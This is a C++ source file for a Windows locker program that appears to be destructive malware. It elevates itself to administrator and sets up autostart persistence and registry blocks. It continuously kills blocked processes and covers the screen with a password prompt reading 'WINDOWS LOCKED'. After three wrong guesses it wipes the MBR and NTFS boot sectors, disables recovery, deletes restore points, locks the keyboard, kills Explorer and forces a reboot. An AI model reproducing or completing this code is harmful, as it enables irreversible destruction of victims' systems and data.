// language: C++, file: src/main.cpp
#include <windows.h>
#include <bcrypt.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <thread>
#include <chrono>
#include "config.h"
#include "mbr.h"
#include "keyboard.h"
#include "persistence.h"
#include "recovery.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "bcrypt.lib")

static HWND g_edit = nullptr;
static HWND g_label = nullptr;
static int g_attempts = 0;
static bool g_unlocked = false;

static std::string wide_to_utf8(const std::wstring& w) {
    if (w.empty()) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                                  nullptr, 0, nullptr, nullptr);
    if (len <= 0) return {};
    std::string out(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                        out.data(), len, nullptr, nullptr);
    return out;
}

static bool password_matches(const std::wstring& input) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_HASH_HANDLE hHash = nullptr;
    PUCHAR hash = nullptr;
    DWORD hashLen = 0, cb = 0;
    bool ok = false;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0) != 0)
        return false;

    if (BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLen,
                          sizeof(hashLen), &cb, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    hash = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, hashLen);
    if (!hash) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    if (BCryptCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0) == 0) {
        std::string salt(CFG_SALT);
        std::string input_utf8 = wide_to_utf8(input);
        std::string full = salt + input_utf8;

        BCryptHashData(hHash, (PUCHAR)full.data(), (ULONG)full.size(), 0);
        BCryptFinishHash(hHash, hash, hashLen, 0);

        char hex[65]{};
        for (DWORD i = 0; i < hashLen && (i * 2 + 2) < sizeof(hex); i++)
            sprintf_s(hex + i * 2, 3, "%02x", hash[i]);

        ok = (_stricmp(hex, CFG_PASSWORD_HASH) == 0);
        BCryptDestroyHash(hHash);
    }

    HeapFree(GetProcessHeap(), 0, hash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static void do_wipe() {
    bool ok_mbr = CFG_KILL_MBR ? wipe_mbr() : false;
    disable_recovery();
    delete_restore_points();
    if (CFG_WIPE_BOOT) wipe_ntfs_boot_sectors();

    start_keyboard_lock();

    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};

    wchar_t tk[] = L"taskkill /f /im explorer.exe";
    if (CreateProcessW(nullptr, tk, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // shutdown — последним, когда всё уже затёрто
    wchar_t cmd[] = L"shutdown /r /t 5 /f";
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    (void)ok_mbr;
}

static void on_check(HWND hwnd) {
    wchar_t buf[128]{};
    GetWindowTextW(g_edit, buf, 128);
    std::wstring input(buf);

    if (password_matches(input)) {
        g_unlocked = true;
        SetWindowTextW(g_label, L"Correct!");
        PostMessageW(hwnd, WM_CLOSE, 0, 0);
        return;
    }

    g_attempts++;
    SetWindowTextW(g_edit, L"");
    int left = 3 - g_attempts;
    wchar_t msg[64];
    if (left > 0) {
        swprintf_s(msg, 64, L"Wrong! Left: %d", left);
        SetWindowTextW(g_label, msg);
    } else {
        do_wipe();
        SetWindowTextW(g_label, L"SYSTEM DESTROYED");
    }
}

static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        g_label = CreateWindowW(L"STATIC", L"WINDOWS LOCKED",
                                WS_CHILD | WS_VISIBLE | SS_CENTER,
                                50, 100, 700, 40, hwnd, nullptr, nullptr, nullptr);
        g_edit = CreateWindowW(L"EDIT", L"",
                               WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER,
                                200, 200, 400, 40, hwnd, nullptr, nullptr, nullptr);
        CreateWindowW(L"BUTTON", L"CHECK",
                      WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                      300, 280, 200, 50, hwnd, (HMENU)1, nullptr, nullptr);

        HFONT font = CreateFontW(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                 DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                                 CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                                 DEFAULT_PITCH | FF_MODERN, L"Consolas");
        SendMessageW(g_label, WM_SETFONT, (WPARAM)font, TRUE);
        SendMessageW(g_edit, WM_SETFONT, (WPARAM)font, TRUE);
        SetFocus(g_edit);
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == 1) on_check(hwnd);
        return 0;
    case WM_CLOSE:
        if (g_unlocked) {
            DestroyWindow(hwnd);
        }
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                 &adminGroup)) {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    if (!isAdmin) {
        wchar_t exe[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe, MAX_PATH);
        SHELLEXECUTEINFOW sei{ sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = exe;
        sei.nShow = SW_SHOWNORMAL;
        ShellExecuteExW(&sei);
        return 0;
    }

    apply_reg_blocks();
    if (CFG_AUTOSTART) install_autostart();

    std::thread([] {
        for (;;) {
            kill_blocked_processes();
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }).detach();

    WNDCLASSW wc{};
    wc.lpfnWndProc = wnd_proc;
    wc.hInstance = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    wc.hCursor = LoadCursorW(nullptr, IDC_ARROW);
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST,
                                L"LockerWnd", L"System Locker",
                                WS_POPUP | WS_VISIBLE,
                                0, 0, GetSystemMetrics(SM_CXSCREEN),
                                GetSystemMetrics(SM_CYSCREEN),
                                nullptr, nullptr, hInst, nullptr);

    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                 SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
